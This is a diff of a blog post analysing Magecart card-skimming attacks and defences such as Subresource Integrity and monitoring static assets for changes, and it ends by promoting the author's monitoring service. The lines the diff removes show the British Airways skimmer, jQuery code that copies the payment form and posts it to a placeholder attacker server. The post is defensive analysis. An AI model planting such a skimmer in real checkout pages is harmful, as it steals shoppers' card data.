@@ -28,28 +28,8 @@ The code in the British Airways attack was the following:
 ![](./british-airways.png)
 
 Here's a more readable version of it:
-```javascript
-    window.onload = function() {
-        // Triggering the function when users submit payment details
-        jQuery(".btn-success").bind ("mouseup touchend", function(t) {
-            var e={};
-            // Copying the data inside of the payment form
-            jQuery("#payment-form").serializeArray().map(function(t){
-                e[t.name] = t.value});
-            // Creating a JSON with the credit card data    
-            var n=JSON.stringify(e);
-            setTimeout(function() {
-                    jQuery.ajax({
-                        // POST request to Magecart controlled server
-                        type:"POST",
-                        async:!0,
-                        // Malicious Server controlled by Magecart
-                        url:"https://malicious-service.com/carding-api/",
-                        data:n,
-                        dataType:"application/json"})},
-                500)})};
 
-```
+<iframe width="100%" height="300" src="//jsfiddle.net/ferrucciob/0xtswebj/embedded/js/dark/" allowfullscreen="allowfullscreen" allowpaymentrequest frameborder="0"></iframe>
 
 
 
@@ -140,10 +120,83 @@ Now that we've understood how the group organises its attacks let's figure out a
 
 ### Subresource Integrity
 
-### Crawling
+To protect static assets on CDNs like jQuery or other libraries the easiest thing to do is to use the "integrity" tag inside your HTML code.
+
+Here's an example of this used in practice:
+
+<iframe width="100%" height="300" src="//jsfiddle.net/ferrucciob/tp0Lndj6/embedded/html/dark/" allowfullscreen="allowfullscreen" allowpaymentrequest frameborder="0"></iframe>
+
+The idea is to include the script along with its cryptographic hash (e.g. SHA-384) when creating the web page.
+
+The browser can then download the script and compute the hash over the downloaded file. The script will only be executed if both hashes match.
+
+The problem of this approach is that if the subresource integrity breaks you need to setup a failover, to make sure the website continues working properly in case the resource breaks. And also the failover can be targeted.
+
+Also many static scripts load themselves through js code other static assets on other hosts, which can become themselves the new attack vectors.
+
+This solution would've probably worked to prevent the British Airways exploit on the modernizr js library.
+
+But all the other instances of skimming attacked dynamic resources (eg. Inbenta, ShopperApproved plugin) or injected javascript directly in the checkout page.
 
 ### Detecting Code Obfuscation
 
+A pattern we can notice in the Ticketmaster and Shopper Approved breaches is the use of obfuscated Javascript to conduct the attacks.
+
+#### So can we detect that?
+
+Code obfuscation can be done in infinite different ways.
+
+Up to now Magecart converted the code into unicode to make it less understandable, but if we wrote something to detect suspect unicode inside javascript they could start obfuscating code in countless other ways like this:
+
+<iframe width="100%" height="300" src="//jsfiddle.net/ferrucciob/48q7pdym/embedded/js/dark/" allowfullscreen="allowfullscreen" allowpaymentrequest frameborder="0"></iframe>
+
+So the short answer is NO, we can't detect all kinds of code obfuscation and hackers learn fast how to circumvent these measures.
+
 ### Avoiding external CDNs
 
-### Hashing Values and checking diffs
+We could avoid completely hosting files on external CDNs, but in many cases websites depend on external services for Customer Support, to Analytics.
+
+This is just too much work to make any sense.
+
+Also we'd have to make sure our static resources don't get compromised on our own servers.
+
+### Downloading Static Assets and Checking Diffs
+
+This seems to be the best idea to prevent and detect this kind of attacks.
+
+The idea is pretty straightforward. To check for a website uptime you ping the server.
+
+To check if a file changed you open a browser tab and check the page.
+
+Similarly to check what static assets are loaded and what's their content we could write a software to automate this.
+
+The software should have the following features:
+
+* It should visit a our website and download all of its javascript.
+
+* Every x minutes it should load our website, download its static assets and compare them with the ones it has in memory. If there's a change in any of these files it should be able to send an alert.
+
+* It should integrate with the deployment and Version Control system and notified when a new deployment happens, to understand when changes are legitimate.
+
+Obviously building and mantaining something like this comes at a cost.
+
+For this reason I decided to build it as a service. The advantages of this approach is that focusing on this problem I can add more sophisticated features to increase security like:
+
+* Finding outliers in deployment times (eg. deployment outside of working hours)
+
+* Using various residential proxies for monitoring, to avoid IP fingerprinting by Magecart (they're doing it)
+
+* Collaboration and communication with services that provide dynamic assets to keep track of legitimate code changes.
+
+* Any good idea that comes from research
+
+In my opinion relying on an external service makes perfect sense as monitoring for this kind of attacks is kind of like checking for uptime pinging a server. It doesn't require any more access priviliges than a regular user.
+
+You can find the service I developed here [Magehash](https://magehash.com)
+
+At the moment it's a service on its own, with its own login and dashboard panel, but I'm looking forward to find out and research what threat monitoring platforms I can integrate with to integrate better in different workflows.
+
+For any feedback or ideas of any kind you can also DM me on twitter or email me at hi \[at] [this domain]
+
+#### Footnotes
+**This analysis would've not been possible without the amazing work done over the years at [RiskIQ](https://riskiq.com) by [Yonathan Klijnsma](https://twitter.com/ydklijnsma)**
